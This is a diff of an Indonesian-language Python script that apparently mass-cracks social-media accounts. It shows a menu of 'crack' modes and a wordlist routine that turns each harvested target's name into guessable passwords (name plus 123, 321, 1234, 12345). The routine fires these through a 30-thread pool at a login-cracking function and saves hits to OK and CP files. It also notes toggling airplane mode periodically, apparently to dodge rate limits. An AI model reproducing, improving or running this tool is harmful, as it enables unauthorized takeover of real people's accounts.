@@ -213,7 +213,7 @@ def menu(my_name,my_id):
 	alvino_xy(f'{h}IP  : {ip}')
 	cetak(nel('\t[bold cyan]           • PILIH PENGEN NGAPAIN LO • [/bold cyan]'))
 	print('')
-	cetak(nel('[bold green] 🇮🇩1. Crack Publik\n 🇮🇩2. Crack Follower\n 🇮🇩3. Crack Grup\n 🇮🇩4. Crack File\n 🇮🇩5. Hasil Crack\n 🇮🇩0. Keluar [bold green]')) 
+	cetak(nel('[bold green] 🇮🇩1. Crack Massal\n 🇮🇩2. Crack Follower\n 🇮🇩3. Crack Grup\n 🇮🇩4. Crack File\n 🇮🇩5. Hasil Crack\n 🇮🇩0. Keluar [bold green]')) 
 	_____cowok__pink_____ = input('\n➥➥➣Pilih : ')
 	if _____cowok__pink_____ in ['1']:
 		dump_massal()
@@ -623,12 +623,9 @@ def setting():
 	exit() 
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	cetak(nel('[bold cyan]  SABAR CONG MSIH DALAM PROSES [bold cyan]')) 
-	print(f'                    {m}H {k}A {h}R {u}A {b}P {u}  ★  {b}S {u}A {h} B{k} A{m} R{b}')
-	print('')
-	print(f'➥➥➣Hasil {h}OK{u} Tersimpan Di : {h}OK/%s {b}'%(okc))
-	print(f'➥➥➣Hasil {k}CP{h} Tersimpan Di : {k}CP/%s {b}'%(cpc))
-	print(f'➥➥➣Mainkan Mode Pesawat Setiap {h}1k{u} Idz\n')
+	jalan(f'➥➥➣ Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
+	jalan(f'➥➥➣ Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
+	jalan(f'➥➥➣ Mainkan Mode Jandazz Setiap {m}500{x} Idz\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -639,18 +636,18 @@ def passwrd():
 					pass
 				else:
 					pwv.append(frs+'123')
-                                        pwv.append(frs+'1234')
+					pwv.append(frs+'321')
+					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
-					pwv.append(frs+'123456')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-                                        pwv.append(frs+'1234')
+					pwv.append(frs+'321')
+					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
-					pwv.append(frs+'123456')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
@@ -666,16 +663,16 @@ def passwrd():
 			else:
 				pool.submit(crackmbasic,idf,pwv)
 	print('')
-	cetak(nel('\t[purple]➥➥➣[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[purple] <<[yellow] '))
-	print(f'[{h}•{u}]{h} OK : {h}%s '%(ok))
-	print(f'{k}[{k}•{h}]{k} CP : {k}%s{u} '%(cp))
+	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
+	print(f'➤[{b}•➤]{h} OK : {h}%s '%(ok))
+	print(f'➤[{b}•➤]{k} CP : {k}%s{x} '%(cp))
 	print('')
-	print('{k}➥➥➣Lanjut Crack Kembali ( Y/t ) ? ')
-	woi = input('➥➥➣Pilih : ')
+	print('➤ Lanjut Crack Kembali ( Y/t ) ? ')
+	woi = input('➤ Pilih : ')
 	if woi in ['y','Y']:
 		back()
 	else:
-		print(f'\t{x}➥➥➣{k} Good Bye Dadaahh{u} ')
+		print(f'\t➤{k} Good Bye Dadaahh ')
 		time.sleep(2)
 		exit()
 #--------------------[ METODE-B-API ]-----------------#
